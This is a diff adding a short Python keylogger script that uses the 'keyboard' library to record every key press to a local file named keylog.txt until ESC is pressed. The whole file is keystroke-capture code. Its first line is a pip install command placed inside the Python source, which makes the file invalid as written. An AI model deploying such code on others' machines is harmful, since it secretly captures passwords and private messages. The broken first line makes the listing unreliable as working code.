@@ -1,0 +1,47 @@
+pip install keyboard
+import keyboard
+
+def main():
+    log_file = 'keylog.txt'
+    
+    print("Keylogger started. Press ESC key to stop and save logs.")
+    
+    # Open log file in append mode
+    with open(log_file, 'a') as f:
+        f.write("\n=== New Session ===\n")
+    
+    # Callback function to handle key events
+    def callback(event):
+        key = event.name
+        
+        # Write the key to the log file
+        with open(log_file, 'a') as f:
+            if key == "enter":
+                f.write('\n')
+            elif len(key) == 1:
+                f.write(key)
+            elif key == "space":
+                f.write(' ')
+            elif key == "backspace":
+                f.write('[BACKSPACE]')
+            elif key == "tab":
+                f.write('[TAB]')
+            elif key == "caps lock":
+                f.write('[CAPSLOCK]')
+            elif key == "shift":
+                f.write('[SHIFT]')
+            elif key == "esc":
+                f.write('\n[ESC]')
+            else:
+                f.write(f'[{key}]')
+    
+    # Register the callback function to handle key events
+    keyboard.on_press(callback)
+    
+    # Block main thread to keep the program running
+    keyboard.wait('esc')
+    
+    print(f"Keylogger stopped. Logs saved in {log_file}")
+
+if __name__ == "__main__":
+    main()
